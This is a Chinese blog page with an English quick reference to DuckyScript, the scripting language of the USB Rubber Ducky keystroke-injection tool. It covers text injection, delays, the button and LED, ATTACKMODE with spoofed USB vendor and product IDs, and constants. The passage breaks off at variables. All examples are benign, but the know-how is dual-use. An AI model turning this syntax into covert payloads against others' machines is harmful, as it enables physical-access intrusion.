@@ -1,0 +1,1509 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+    <link rel="canonical" href="https://blog.zhaosn.top/DuckyScriptQuickReference/"/>
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Zhao SN">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="CommentsREMThe REM command does not perform any keystroke injection functions. REM gets its name from the word remark. While REM may be used to add vertical spacing within a payload, blank lines are a">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>DuckyScript脚本 - Zhaosn的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"blog.zhaosn.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":45,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":4},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"db0474f77b68ddf3fb7cc21650cb844d","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?db0474f77b68ddf3fb7cc21650cb844d";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 40vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Zhaosn的博客🐉🐍</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/DMS2Decimal/" target="_self">
+                <i class="iconfont icon-map"></i>
+                <span>DMS</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/banner.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.6)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DuckyScript脚本"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-19 18:56" pubdate>
+          2026年3月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          648 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          2 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar category-bar" style="margin-right: -1rem">
+    
+
+
+
+
+
+<div class="category-list">
+  
+  
+    
+    
+    
+    <div class="category row nomargin-x">
+      <a class="category-item 
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="嵌入式"
+        id="heading-62f8a8e20d03835fb846c1e03058cccb" role="tab" data-toggle="collapse" href="#collapse-62f8a8e20d03835fb846c1e03058cccb"
+        aria-expanded="true"
+      >
+        嵌入式
+        <span class="list-group-count">(1)</span>
+        <i class="iconfont icon-arrowright"></i>
+      </a>
+      
+      <div class="category-collapse collapse show" id="collapse-62f8a8e20d03835fb846c1e03058cccb"
+           role="tabpanel" aria-labelledby="heading-62f8a8e20d03835fb846c1e03058cccb">
+        
+        
+          
+  <div class="category-post-list">
+    
+    
+      
+      
+        <a href="/DuckyScriptQuickReference/" title="DuckyScript脚本"
+           class="list-group-item list-group-item-action
+           active">
+          <span class="category-post">DuckyScript脚本</span>
+        </a>
+      
+    
+  </div>
+
+        
+      </div>
+    </div>
+  
+</div>
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DuckyScript脚本</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><h3 id="REM"><a href="#REM" class="headerlink" title="REM"></a>REM</h3><p>The <code>REM</code> command does not perform any keystroke injection functions. <code>REM</code> gets its name from the word remark. While <code>REM</code> may be used to add vertical spacing within a payload, blank lines are also acceptable and will not be processed by the compiler.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">REM This is a comment<br></code></pre></td></tr></table></figure>
+
+<h3 id="REM-BLOCK"><a href="#REM-BLOCK" class="headerlink" title="REM_BLOCK"></a>REM_BLOCK</h3><p>Defining a comment block is simple! Start the comment with <code>REM_BLOCK</code> and end the comment with <code>END_REM</code>; everything in between will be considered a comment without the need to prepend every new line with <code>REM</code>. Comment blocks can be especially useful when you have multiple lines to be included in a single comment or want to retain formatting.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">REM_BLOCK DOCUMENTATION<br>        USAGE:<br>            Place at beginning of payload (besides ATTACKMODE) to act as dynamic<br>            boot delay<br><br>        TARGETS:<br>            Any system that reflects CAPSLOCK will detect minimum required delay<br>            Any system that does not reflect CAPSLOCK will hit the max delay of 3000ms<br>END_REM<br></code></pre></td></tr></table></figure>
+
+<h2 id="Keystroke-Injection"><a href="#Keystroke-Injection" class="headerlink" title="Keystroke Injection"></a>Keystroke Injection</h2><h3 id="STRING"><a href="#STRING" class="headerlink" title="STRING"></a>STRING</h3><p>The <code>STRING</code> command keystroke injects (types) a series of keystrokes. <code>STRING</code> will automatically interpret uppercase letters by holding the <code>SHIFT</code> modifier key where necessary. The <code>STRING</code> command will also automatically press the SPACE cursor key, however trailing spaces will be omitted.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">STRING The quick brown fox jumps over the lazy dog<br></code></pre></td></tr></table></figure>
+
+<h3 id="STRINGLN"><a href="#STRINGLN" class="headerlink" title="STRINGLN"></a>STRINGLN</h3><p>The <code>STRINGLN</code> command, like <code>STRING</code>, will inject a series of keystrokes then terminate with a carriage return (<code>ENTER</code>).</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">STRINGLN      _      _      _      USB       _      _      _<br>STRINGLN   __(.)&lt; __(.)&gt; __(.)=   Rubber   &gt;(.)__ &lt;(.)__ =(.)__<br>STRINGLN   \___)  \___)  \___)    Ducky!    (___/  (___/  (___/<br></code></pre></td></tr></table></figure>
+
+<h3 id="STRING-Blocks"><a href="#STRING-Blocks" class="headerlink" title="STRING Blocks"></a>STRING Blocks</h3><h4 id="STRING-Blocks-1"><a href="#STRING-Blocks-1" class="headerlink" title="STRING Blocks"></a>STRING Blocks</h4><p><code>STRING</code> blocks can be used effectively to convert multiple lines into one without needing to prepend each line with <code>STRING</code></p>
+
+    <div class="fold">
+      <div class="fold-title fold-warning collapsed" data-toggle="collapse" href="#collapse-d1fd3e07" role="button" aria-expanded="false" aria-controls="collapse-d1fd3e07">
+        <div class="fold-arrow">▶</div>title
+      </div>
+      <div class="fold-collapse collapse" id="collapse-d1fd3e07">
+        <div class="fold-content">
+          <p><code>STRING</code> blocks strip leading white space and ignore new lines!</p>
+        </div>
+      </div>
+    </div>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">STRING<br>    a<br>    b<br>    c<br>END_STRING<br></code></pre></td></tr></table></figure>
+
+<p>is the equivalent of</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">STRING a<br>STRING b<br>STRING c<br></code></pre></td></tr></table></figure>
+
+<p>Or in this case: <code>STRING abc</code></p>
+<h4 id="STRINGLN-Blocks"><a href="#STRINGLN-Blocks" class="headerlink" title="STRINGLN Blocks"></a>STRINGLN Blocks</h4><p><code>STRINGLN</code> blocks can be used like <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Here_document">here-doc</a>; allowing you to inject multiple lines <strong>as they are written in the payload.</strong></p>
+
+    <div class="fold">
+      <div class="fold-title fold-warning collapsed" data-toggle="collapse" href="#collapse-dafa6164" role="button" aria-expanded="false" aria-controls="collapse-dafa6164">
+        <div class="fold-arrow">▶</div>title
+      </div>
+      <div class="fold-collapse collapse" id="collapse-dafa6164">
+        <div class="fold-content">
+          <p><code>STRINGLN</code> blocks strip the first tab but will preserve all other formatting</p>
+        </div>
+      </div>
+    </div>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">STRINGLN<br>    a<br>    b<br>    c<br>END_STRINGLN<br></code></pre></td></tr></table></figure>
+
+<p>is the equivalent of</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">STRINGLN a<br>STRINGLN b<br>STRINGLN c<br></code></pre></td></tr></table></figure>
+
+<h4 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h4><p>Deploying this payload will produce the following keystroke injection on the target machine:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">a<br>b<br>c<br></code></pre></td></tr></table></figure>
+
+<h3 id="Cursor-Keys"><a href="#Cursor-Keys" class="headerlink" title="Cursor Keys"></a>Cursor Keys</h3><p>The cursor keys are used to navigate the cursor to a different position on the screen.</p>
+<blockquote>
+<p><code>UP</code> <code>DOWN</code> <code>LEFT</code> <code>RIGHT</code></p>
+<p><code>UPARROW</code> <code>DOWNARROW</code> <code>LEFTARROW</code> <code>RIGHTARROW</code></p>
+<p><code>PAGEUP</code> <code>PAGEDOWN</code> <code>HOME</code> <code>END</code></p>
+<p><code>INSERT</code> <code>DELETE</code> <code>DEL</code> <code>BACKSPACE</code></p>
+<p><code>TAB</code></p>
+<p><code>SPACE</code></p>
+</blockquote>
+<h3 id="System-Keys"><a href="#System-Keys" class="headerlink" title="System Keys"></a>System Keys</h3><p>System keys are primarily used by the operating system for special functions and may be used to interact with both text areas and navigating the user interface.</p>
+<blockquote>
+<p><code>ENTER</code></p>
+<p><code>ESCAPE</code></p>
+<p><code>PAUSE BREAK</code></p>
+<p><code>PRINTSCREEN</code></p>
+<p><code>MENU APP</code></p>
+<p><code>F1</code> <code>F2</code> <code>F3</code> <code>F4</code> <code>F5</code> <code>F6</code> <code>F7</code> <code>F8</code> <code>F9</code> <code>F0</code> <code>F11</code> <code>F12</code></p>
+</blockquote>
+<h3 id="Basic-Modifier-Keys"><a href="#Basic-Modifier-Keys" class="headerlink" title="Basic Modifier Keys"></a>Basic Modifier Keys</h3><p>Modifier keys held in combination with another key to perform a special function. Common keyboard combinations for the PC include the familiar <code>CTRL c</code> for copy, <code>CTRL x</code> for cut, and <code>CTRL v</code> for paste.</p>
+<blockquote>
+<p><code>SHIFT</code></p>
+<p><code>ALT</code></p>
+<p><code>CONTROL</code> or <code>CTRL</code></p>
+<p><code>COMMAND</code></p>
+<p><code>WINDOWS</code> or <code>GUI</code></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">REM Windows Modifier Key Example<br><br>REM Open the RUN Dialog<br>GUI r<br><br>REM Close the window<br>ALT F4<br></code></pre></td></tr></table></figure>
+
+<h3 id="Key-and-Modifier-Combos"><a href="#Key-and-Modifier-Combos" class="headerlink" title="Key and Modifier Combos"></a>Key and Modifier Combos</h3><p>In addition to the basic modifier key combinations, such as <code>CTRL c</code>, modifiers and keys may be combined arbitrarily.</p>
+<blockquote>
+<p><code>CTRL SHIFT</code></p>
+<p><code>ALT SHIFT</code></p>
+<p><code>COMMAND CTRL</code></p>
+<p><code>COMMAND CTRL SHIFT</code></p>
+<p><code>COMMAND OPTION</code></p>
+<p><code>COMMAND OPTION SHIFT</code></p>
+<p><code>CONTROL ALT DELETE</code></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">CTRL ALT DELETE<br></code></pre></td></tr></table></figure>
+
+<h3 id="Standalone-Modifier-Keys"><a href="#Standalone-Modifier-Keys" class="headerlink" title="Standalone Modifier Keys"></a>Standalone Modifier Keys</h3><p>Injecting a modifier key alone without another key — such as pressing the <code>WINDOWS</code> key — may be achieved by prepending the modifier key with the <code>INJECT_MOD</code> command.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">REM Example pressing Windows key alone<br><br>INJECT_MOD WINDOWS<br></code></pre></td></tr></table></figure>
+
+<h3 id="Lock-Keys"><a href="#Lock-Keys" class="headerlink" title="Lock Keys"></a>Lock Keys</h3><p>Lock keys toggle the lock state (on or off) and typically change the interpretation of subsequent keypresses. For example, caps lock generally makes all subsequent letter keys appear in uppercase.</p>
+<blockquote>
+<p><code>CAPSLOCK</code></p>
+<p><code>NUMLOCK</code></p>
+<p><code>SCROLLOCK</code></p>
+</blockquote>
+<h2 id="Delays"><a href="#Delays" class="headerlink" title="Delays"></a>Delays</h2><h3 id="DELAY"><a href="#DELAY" class="headerlink" title="DELAY"></a>DELAY</h3><p>The <code>DELAY</code> command instructs the USB Rubber Ducky to momentarily pause execution of the payload. This is useful when deploying a payload which must “wait” for an element — such as a window — to load. The <code>DELAY</code> command accepts the time parameter in milliseconds.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">DELAY for 100 milliseconds (one tenth of a second)<br>DELAY 100<br></code></pre></td></tr></table></figure>
+
+
+    <div class="fold">
+      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-3c978266" role="button" aria-expanded="false" aria-controls="collapse-3c978266">
+        <div class="fold-arrow">▶</div>title
+      </div>
+      <div class="fold-collapse collapse" id="collapse-3c978266">
+        <div class="fold-content">
+          <p>The minimum delay value is 20.</p>
+        </div>
+      </div>
+    </div>
+
+<p>The <code>DELAY</code> command may also accept an integer variable.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">VAR $WAIT = 500<br>DELAY $WAIT<br></code></pre></td></tr></table></figure>
+
+
+    <div class="fold">
+      <div class="fold-title fold-warning collapsed" data-toggle="collapse" href="#collapse-bc986b71" role="button" aria-expanded="false" aria-controls="collapse-bc986b71">
+        <div class="fold-arrow">▶</div>title
+      </div>
+      <div class="fold-collapse collapse" id="collapse-bc986b71">
+        <div class="fold-content">
+          <p><code>DELAY</code> timings might differ slightly depending on the <code>ATTACKMODE</code> the USB Rubber Ducky is in when executing the <code>DELAY</code> and depending on the target host.</p>
+        </div>
+      </div>
+    </div>
+
+<h2 id="The-Button"><a href="#The-Button" class="headerlink" title="The Button"></a>The Button</h2><p>By default, if no other button command is currently in use, pressing the button during payload execution will make the USB Rubber Ducky stop any further keystroke injection. It will then become an ordinary USB flash drive, commonly referred to as “arming mode”.</p>
+<h3 id="WAIT-FOR-BUTTON-PRESS"><a href="#WAIT-FOR-BUTTON-PRESS" class="headerlink" title="WAIT_FOR_BUTTON_PRESS"></a>WAIT_FOR_BUTTON_PRESS</h3><p>Halts payload execution until a button press is detected. When this command is reached in the payload, no further execution will occur.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">STRING Press the button...<br>WAIT_FOR_BUTTON_PRESS<br>STRING The button was pressed!<br></code></pre></td></tr></table></figure>
+
+<h3 id="BUTTON-DEF"><a href="#BUTTON-DEF" class="headerlink" title="BUTTON_DEF"></a>BUTTON_DEF</h3><p>The <code>BUTTON_DEF</code> command defines a function which will execute when the button is pressed anytime within the payload so long as the button control is not already in use by the <code>WAIT_FOR_BUTTON_PRESS</code> command or other such function.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">BUTTON_DEF<br>    STRINGLN The button was pressed.<br>END_BUTTON<br><br>STRINGLN Press the button with the next 10 seconds<br>DELAY 10000<br></code></pre></td></tr></table></figure>
+
+<h3 id="DISABLE-BUTTON"><a href="#DISABLE-BUTTON" class="headerlink" title="DISABLE_BUTTON"></a>DISABLE_BUTTON</h3><p>The <code>DISABLE_BUTTON</code> command prevents the button from calling the <code>BUTTON_DEF</code>.</p>
+<h3 id="ENABLE-BUTTON"><a href="#ENABLE-BUTTON" class="headerlink" title="ENABLE_BUTTON"></a>ENABLE_BUTTON</h3><p>The <code>ENABLE_BUTTON</code> command allows pressing the button to call the <code>BUTTON_DEF</code>.</p>
+<h2 id="The-LED"><a href="#The-LED" class="headerlink" title="The LED"></a>The LED</h2><p>The USB Rubber Ducky includes an LED which may be helpful when deploying certain payloads where feedback is important.</p>
+<h3 id="LED-OFF"><a href="#LED-OFF" class="headerlink" title="LED_OFF"></a>LED_OFF</h3><p>The <code>LED_OFF</code> command will disable all LED modes.</p>
+<h3 id="LED-R"><a href="#LED-R" class="headerlink" title="LED_R"></a>LED_R</h3><p>The <code>LED_R</code> command will enable the red LED.</p>
+<h3 id="LED-G"><a href="#LED-G" class="headerlink" title="LED_G"></a>LED_G</h3><p>The <code>LED_G</code> command will enable the green LED.</p>
+<h2 id="ATTACKMODE"><a href="#ATTACKMODE" class="headerlink" title="ATTACKMODE"></a>ATTACKMODE</h2><p>An attack mode is the device type that a USB Rubber Ducky, is functioning as or emulating. If no <code>ATTACKMODE</code> command is specified as the first command (excluding <code>REM</code>), the <code>HID</code> attack mode will execute, allowing the device to function as a keyboard. The <code>ATTACKMODE</code> command may be run multiple times within a payload, which may cause the device to be re-enumerated by the target if the attack mode changes.</p>
+<h3 id="Required-Parameters"><a href="#Required-Parameters" class="headerlink" title="Required Parameters"></a>Required Parameters</h3><table>
+<thead>
+<tr>
+<th>ATTACKMODE Parameter</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>HID</code></td>
+<td>Functions as a Human Interface Device, or Keyboard, for keystroke injection.</td>
+</tr>
+<tr>
+<td><code>STORAGE</code></td>
+<td>Functions as USB Mass Storage, or a Flash Drive, for copying files to/from the target.</td>
+</tr>
+<tr>
+<td><code>HID STORAGE</code></td>
+<td>Functions as both USB Mass Storage and Human Interface Device</td>
+</tr>
+<tr>
+<td><code>OFF</code></td>
+<td>Will not function as any device. May be used to disconnect the device from the target.</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">ATTACKMODE HID STORAGE<br>REM The USB Rubber Ducky will act as both a flash drive and keyboard<br></code></pre></td></tr></table></figure>
+
+<h3 id="Optional-Parameters"><a href="#Optional-Parameters" class="headerlink" title="Optional Parameters"></a>Optional Parameters</h3>
+    <div class="fold">
+      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-1097cbdd" role="button" aria-expanded="false" aria-controls="collapse-1097cbdd">
+        <div class="fold-arrow">▶</div>title
+      </div>
+      <div class="fold-collapse collapse" id="collapse-1097cbdd">
+        <div class="fold-content">
+          <p>When using these optional parameters, <code>VID</code> and <code>PID</code> must be used as a set. Further, <code>MAN</code>, <code>PROD</code> and <code>SERIAL</code> must also be used as a set.</p>
+        </div>
+      </div>
+    </div>
+
+<table>
+<thead>
+<tr>
+<th>ATTACKMODE Parameter</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>VID_</code></td>
+<td>Vendor ID (16-bit HEX)</td>
+</tr>
+<tr>
+<td><code>PID_</code></td>
+<td>Product ID (16-bit HEX)</td>
+</tr>
+<tr>
+<td><code>MAN_</code></td>
+<td>Manufacturer (32 alphanumeric characters)</td>
+</tr>
+<tr>
+<td><code>PROD_</code></td>
+<td>Product (32 alphanumeric characters)</td>
+</tr>
+<tr>
+<td><code>SERIAL_</code></td>
+<td>Serial (12 digits)</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">ATTACKMODE HID VID_046D PID_C31C MAN_HAK5 PROD_DUCKY SERIAL_1337<br>REM Emulated a Keyboard with the following values:<br>REM  - Vendor ID: 046D<br>REM  - Product ID: C31C<br>REM  - Manufacturer: HAK5<br>REM  - Product: DUCKY<br>REM  - Serial: 1337<br></code></pre></td></tr></table></figure>
+
+<h3 id="SAVE-ATTACKMODE"><a href="#SAVE-ATTACKMODE" class="headerlink" title="SAVE_ATTACKMODE"></a>SAVE_ATTACKMODE</h3><p>The <code>SAVE_ATTACKMODE</code> command will save the currently running <code>ATTACKMODE</code> state (including any specified <code>VID</code>, <code>PID</code>, <code>MAN</code>, <code>PROD</code> and <code>SERIAL</code> parameters) such that it may be later restored.</p>
+<h3 id="RESTORE-ATTACKMODE"><a href="#RESTORE-ATTACKMODE" class="headerlink" title="RESTORE_ATTACKMODE"></a>RESTORE_ATTACKMODE</h3><p>The <code>RESTORE_ATTACKMODE</code> command will restore a previously saved <code>ATTACKMODE</code> state.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">ATTACKMODE HID VID_046D PID_C31C MAN_HAK5 PROD_DUCKY SERIAL_1337<br>DELAY 2000<br>SAVE_ATTACKMODE<br>STRING Hello<br>ATTACKMODE OFF<br>DELAY 5000<br>RESTORE_ATTACKMODE<br>DELAY 2000<br>STRING , World!<br></code></pre></td></tr></table></figure>
+
+<h2 id="Constants"><a href="#Constants" class="headerlink" title="Constants"></a>Constants</h2><h3 id="DEFINE"><a href="#DEFINE" class="headerlink" title="DEFINE"></a>DEFINE</h3><p>The <code>DEFINE</code> command is used to define a constant. One may consider the use of a <code>DEFINE</code> within a payload like a find-and-replace at time of compile.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs duckyscript">DEFINE #WAIT 2000<br>DEFINE #TEXT Hello World<br>DEFINE #MYURL example.com<br>DELAY #WAIT<br>STRINGLN #TEXT<br>STRING https://#MYURL<br></code></pre></td></tr></table></figure>
+
+<h2 id="Variables"><a href="#Variables" class="headerlink" title="Variables"></a>Variables</h2><h3 id="VAR"><a href="#VAR" class="headerlink" title="VAR"></a>VAR</h3><p>The <code>VAR</code> command will initiate a variable. Unlike constants, variables begin with a dollar sign (“<code>$</code>“). Variables contain unsigned integers with values from 0 to 65535. Booleans may be represented as well, either by <code>TRUE</code>/<code>FALE</code> or any non-zero number and <code>0</code> respectively.</p>
